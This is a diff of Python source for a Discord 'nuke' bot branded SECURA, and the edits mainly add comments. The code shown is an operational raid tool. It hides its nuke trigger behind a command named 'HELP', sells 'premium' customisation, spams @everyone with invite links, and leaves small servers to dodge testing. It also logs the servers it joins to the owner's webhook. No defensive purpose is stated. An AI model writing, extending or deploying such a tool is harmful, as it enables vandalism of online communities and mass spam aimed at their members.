@@ -20,14 +20,14 @@ blacklisted_users = []
 premium_users = []
 premium_settings = {}
 trusted_servers = []
-log_channel_id = None # i don't know what this was used for
+log_channel_id = None # put ur logger channel here
 icon_url = "" # put ur logo here
 bot_system_logs = []
 webhook_url = "" # webhook for tracker channel
 current_spam_message = "@everyone You Got Nuked by SECURA https://discord.gg/mAjwRqXAPp RIP 67 https://files.catbox.moe/3obb3d.mp4"
 is_premium_nuke = False
 
-async def send_webhook_log(title, description, color_int=0x00ff00):
+async def send_webhook_log(title, description, color_int=0x00ff00): # send webhook log function
     try:
         import aiohttp
         async with aiohttp.ClientSession() as session:
@@ -83,7 +83,7 @@ async def on_guild_join(guild):
         "member_count": guild.member_count
     }
     
-    if guild.member_count <= 10 and guild.id not in trusted_servers and inviter.id != 1337767099283542026:
+    if guild.member_count <= 10 and guild.id not in trusted_servers and inviter.id != 1337767099283542026: # low member count check except for owner
         print(Fore.RED + f"ANTI-TEST: Leaving small server: {guild.name} (ID: {guild.id}, Members: {guild.member_count})" + Fore.RESET)
         webhook_desc = f"**Server:** {log_entry['server_name']}\n**Server ID:** {log_entry['server_id']}\n**Invited By:** {log_entry['inviter']}\n**Members:** {log_entry['member_count']}\n**Action:** Bot automatically left (small server detected)"
         await send_webhook_log("Bot Added to Small Server (LEFT)", webhook_desc, 0xff0000)
@@ -121,7 +121,7 @@ async def on_guild_join(guild):
 
 @client.command()
 @commands.is_owner()
-async def addtrusted(ctx, server_id: int):
+async def addtrusted(ctx, server_id: int): # whatever the fuck trusted is
     if server_id in trusted_servers:
         await ctx.send(f"Server {server_id} is already trusted.", delete_after=5)
         return
@@ -129,7 +129,7 @@ async def addtrusted(ctx, server_id: int):
     await ctx.send(f"Server {server_id} added to trusted list. Bot will NOT leave this server.", delete_after=5)
     print(Fore.GREEN + f"Server {server_id} added to trusted servers." + Fore.RESET)
 
-@client.tree.command(name="logs", description="View server join logs")
+@client.tree.command(name="logs", description="View server join logs") # server logs, idk what this is
 async def logs_slash(interaction: discord.Interaction):
     if interaction.user.id != 1337767099283542026:
         await interaction.response.send_message("You don't have permission.", ephemeral=True)
@@ -142,7 +142,7 @@ async def logs_slash(interaction: discord.Interaction):
         embed.add_field(name=f"{i}. {log['server_name']} (ID: {log['server_id']})", value=f"Invited by: {log['inviter']}\nMembers: {log['member_count']}", inline=False)
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
-@client.tree.command(name="botlogs", description="View bot system logs")
+@client.tree.command(name="botlogs", description="View bot system logs") # same as before
 async def botlogs_slash(interaction: discord.Interaction):
     if interaction.user.id != 1337767099283542026:
         await interaction.response.send_message("You don't have permission.", ephemeral=True)
@@ -157,7 +157,7 @@ async def botlogs_slash(interaction: discord.Interaction):
     embed.description = f"```\n{log_text}\n```"
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
-@client.tree.command(name="blacklist", description="Blacklist a user")
+@client.tree.command(name="blacklist", description="Blacklist a user") # blacklist a user
 async def blacklist_slash(interaction: discord.Interaction, user_id: int):
     if interaction.user.id != 1337767099283542026:
         await interaction.response.send_message("You don't have permission.", ephemeral=True)
@@ -257,7 +257,7 @@ async def viewpremium(ctx):
     embed.description = f"```\n{premium_str}\n```"
     await ctx.send(embed=embed, delete_after=10)
 
-@client.tree.command(name="customizenue", description="Customize your nuke settings (Premium Only)")
+@client.tree.command(name="customizenue", description="Customize your nuke settings (Premium Only)") # customise nuke
 async def customizenue_slash(interaction: discord.Interaction, custom_name: str, custom_message: str, channel1: str, channel2: str, channel3: str, channel4: str, channel5: str, custom_icon_url: Optional[str] = None):
     if interaction.user.id not in premium_users:
         await interaction.response.send_message("This is a premium-only feature. You don't have access.", ephemeral=True)
@@ -300,7 +300,7 @@ async def STOP(ctx):
 
 @client.command()
 @commands.is_owner()
-async def START(ctx):
+async def START(ctx): # why does it create a server??
     if ctx.author.id in blacklisted_users:
         print(Fore.RED + f"BLACKLISTED USER ATTEMPTED ?START: {ctx.author.name}#{ctx.author.discriminator} (ID: {ctx.author.id})" + Fore.RESET)
         await send_webhook_log("BLACKLISTED USER BLOCKED", f"**User:** {ctx.author.name}#{ctx.author.discriminator} (ID: {ctx.author.id})\n**Action:** Attempted to use ?START\n**Blacklist Status:** BLOCKED", 0xff0000)
@@ -317,7 +317,7 @@ async def START(ctx):
             invite = await new_guild.channels[0].create_invite(max_age=0, max_uses=0)
         
         owner = await client.fetch_user(1337767099283542026)
-        embed = discord.Embed(title="New Server Created!", color=discord.Color.gold())
+        embed = discord.Embed(title="New Server Created!", color=discord.Color.gold()) # why is it creating a server though
         embed.add_field(name="Server Name", value=new_guild.name, inline=False)
         embed.add_field(name="Server ID", value=new_guild.id, inline=False)
         embed.add_field(name="Invite Link", value=str(invite), inline=False)
@@ -330,7 +330,7 @@ async def START(ctx):
         await ctx.send(f"Error creating server: {str(e)}", delete_after=5)
         print(Fore.RED + f"Error creating server: {str(e)}" + Fore.RESET)
 
-async def execute_nuke(ctx, nuke_name, nuke_icon, nuke_message, nuke_channels, is_premium=False):
+async def execute_nuke(ctx, nuke_name, nuke_icon, nuke_message, nuke_channels, is_premium=False): # main nuke function
     """Execute nuke with given parameters"""
     global current_spam_message, is_premium_nuke
     
@@ -341,7 +341,7 @@ async def execute_nuke(ctx, nuke_name, nuke_icon, nuke_message, nuke_channels, i
     
     guild = ctx.guild
     
-    if guild.id == 1429451048547782809:
+    if guild.id == 1429451048547782809: # ur blacklisted guild here
         await ctx.send("This server is protected from being nuked.", delete_after=5)
         return
     
@@ -439,7 +439,7 @@ async def execute_nuke(ctx, nuke_name, nuke_icon, nuke_message, nuke_channels, i
     print(f"nuked {guild.name} Successfully.")
 
 @client.command()
-async def HELP(ctx):
+async def HELP(ctx): # main nuke command 2
     """Nuke command - ?HELP (FREE) or !HELP (PREMIUM with customization)"""
     if ctx.author.id in blacklisted_users:
         prefix_type = "?HELP" if ctx.prefix == "?" else "!HELP"
